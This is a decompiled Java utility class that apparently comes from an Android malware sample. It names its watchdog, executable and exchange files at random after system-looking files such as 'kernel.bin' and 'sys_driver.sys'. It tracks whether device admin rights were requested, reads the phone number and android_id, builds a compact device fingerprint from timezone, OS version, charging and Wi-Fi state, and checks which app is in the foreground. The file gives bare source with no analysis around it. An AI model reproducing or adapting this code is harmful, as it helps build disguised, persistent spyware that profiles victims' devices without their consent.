package com.p003fa.p004c;

/* renamed from: com.fa.c.Utilities */
public class Utilities {
    private static java.lang.String[] names = new java.lang.String[]{"update.dat", "settings.bin", "update.bin", "settings.dat", "kernel.bin", "core.bin", "core.sys", "hot_fix.dat", "android.bin", "sys.bin", "inet.dat", "wifi.bin", "fix.bin", "sys_driver.sys", "lock.dat"};

    public static android.content.SharedPreferences GetPreferences(android.content.Context context) {
        return android.preference.PreferenceManager.getDefaultSharedPreferences(context);
    }

    public static android.content.SharedPreferences.Editor GetPreferncesEditor(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).edit();
    }

    public static int GetInstallType(android.content.Context context) {
        return java.lang.Integer.valueOf(com.p003fa.p004c.Utilities.GetPreferences(context).getString("KEY_INSTALL_TYPE", "-1")).intValue();
    }

    public static void SetInstallType(int type, android.content.Context context) {
        android.content.SharedPreferences.Editor editor = com.p003fa.p004c.Utilities.GetPreferncesEditor(context);
        editor.putString("KEY_INSTALL_TYPE", java.lang.String.valueOf(type));
        editor.commit();
    }

    public static boolean GetAdminRightsAsked(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).contains("ADMIN_RIGHTS_ASKED");
    }

    public static void SetAdminRightsAsked(android.content.Context context) {
        android.content.SharedPreferences.Editor editor = com.p003fa.p004c.Utilities.GetPreferences(context).edit();
        editor.putInt("ADMIN_RIGHTS_ASKED", 1);
        editor.commit();
    }

    public static java.lang.String GetDeviceInfoString(android.content.Context context) {
        try {
            byte[] info = com.p003fa.p004c.Utilities.GetDeviceInfoBytes(context);
            if (info != null) {
                return new java.lang.String(info, "UTF-8");
            }
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", " GetDeviceInfoString " + e.getMessage());
        }
        return null;
    }

    public static byte[] GetDeviceInfoBytes(android.content.Context context) {
        try {
            byte timeOffsetByte = (byte) (((java.util.TimeZone.getDefault().getRawOffset() / 1000) / 60) / 60);
            byte[] idBytes = com.p003fa.p004c.Utilities.ToBytes(android.provider.Settings.Secure.getString(context.getApplicationContext().getContentResolver(), "android_id").toCharArray());
            byte version = (byte) android.os.Build.VERSION.SDK_INT;
            byte isWifi = (byte) 0;
            if (((android.net.ConnectivityManager) context.getSystemService("connectivity")).getNetworkInfo(1).isConnected()) {
                isWifi = (byte) 1;
            }
            byte batery = (byte) 0;
            if (context.getApplicationContext().registerReceiver(null, new android.content.IntentFilter("android.intent.action.BATTERY_CHANGED")).getIntExtra("plugged", -1) == 1) {
                batery = (byte) 1;
            }
            byte[] content = new byte[20];
            int i;
            if (idBytes.length < 16) {
                int length = idBytes.length;
                for (i = 0; i < length; i++) {
                    content[i] = idBytes[i];
                }
                for (i = length; i < 16; i++) {
                    content[i] = (byte) 48;
                }
            } else {
                for (i = 0; i < 16; i++) {
                    content[i] = idBytes[i];
                }
            }
            content[16] = timeOffsetByte;
            content[17] = version;
            content[18] = batery;
            content[19] = isWifi;
            return content;
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", "GetDeviceInfoBytes " + e.getMessage());
            return null;
        }
    }

    public static java.lang.String GetDeviceInfoCommandLineArgs(android.content.Context context) {
        try {
            byte timeOffsetByte = (byte) (((java.util.TimeZone.getDefault().getRawOffset() / 1000) / 60) / 60);
            byte[] idBytes = com.p003fa.p004c.Utilities.ToBytes(android.provider.Settings.Secure.getString(context.getApplicationContext().getContentResolver(), "android_id").toCharArray());
            byte version = (byte) android.os.Build.VERSION.SDK_INT;
            byte isWifi = (byte) 0;
            if (((android.net.ConnectivityManager) context.getSystemService("connectivity")).getNetworkInfo(1).isConnected()) {
                isWifi = (byte) 1;
            }
            byte batery = (byte) 0;
            if (context.getApplicationContext().registerReceiver(null, new android.content.IntentFilter("android.intent.action.BATTERY_CHANGED")).getIntExtra("plugged", -1) == 1) {
                batery = (byte) 1;
            }
            return new java.lang.StringBuilder(java.lang.String.valueOf(new java.lang.String(idBytes, "UTF-8"))).append(" ").append(timeOffsetByte).append(" ").append(version).append(" ").append(batery).append(" ").append(isWifi).toString();
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", e.getMessage());
            return null;
        }
    }

    public static java.lang.String GetWatchDogName(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).getString("KEY_WATCH_DOG", null);
    }

    public static java.lang.String GetExecName(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).getString("KEY_EXEC", null);
    }

    public static java.lang.String GetExchangeFileName(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).getString("KEY_EXCHANGE_FILE", null);
    }

    public static void SetRandomNames(android.content.Context context) {
        android.content.SharedPreferences.Editor editor = com.p003fa.p004c.Utilities.GetPreferncesEditor(context);
        java.util.Random randomizer = new java.util.Random();
        int index = randomizer.nextInt(names.length);
        int wdIndex = index;
        java.lang.String wdName = names[wdIndex];
        while (wdIndex == index) {
            index = randomizer.nextInt(names.length);
        }
        java.lang.String execName = names[index];
        int execIndex = index;
        while (true) {
            if (execIndex == index || wdIndex == index) {
                index = randomizer.nextInt(names.length);
            } else {
                java.lang.String exchangeName = names[index];
                editor.putString("KEY_WATCH_DOG", wdName);
                editor.putString("KEY_EXEC", execName);
                editor.putString("KEY_EXCHANGE_FILE", exchangeName);
                editor.commit();
                return;
            }
        }
    }

    public static java.lang.String GetDeviceId(android.content.Context context) {
        return android.provider.Settings.Secure.getString(context.getApplicationContext().getContentResolver(), "android_id");
    }

    public static java.lang.String GetPhoneNumber(android.content.Context context) {
        try {
            java.lang.String mPhoneNumber = ((android.telephony.TelephonyManager) context.getSystemService("phone")).getLine1Number();
            if (mPhoneNumber == null) {
                return "NO_SIM";
            }
            return mPhoneNumber;
        } catch (java.lang.Exception e) {
            return "NO_SIM";
        }
    }

    public static boolean IsRandomNames(android.content.Context context) {
        return com.p003fa.p004c.Utilities.GetPreferences(context).contains("KEY_WATCH_DOG");
    }

    public static boolean IsProcessRunningAndTop(java.lang.String name) {
        for (com.jaredrummler.android.processes.models.AndroidAppProcess p : com.jaredrummler.android.processes.ProcessManager.getRunningAppProcesses()) {
            if (p.getPackageName().equalsIgnoreCase(name)) {
                if (p.foreground) {
                    return true;
                }
                return false;
            }
        }
        return false;
    }

    public static byte[] ToBytes(char[] data) {
        byte[] toRet = new byte[data.length];
        for (int i = 0; i < toRet.length; i++) {
            toRet[i] = (byte) data[i];
        }
        return toRet;
    }

    public static char[] ToChar(byte[] data) {
        char[] toRet = new char[data.length];
        for (int i = 0; i < toRet.length; i++) {
            toRet[i] = (char) data[i];
        }
        return toRet;
    }
}
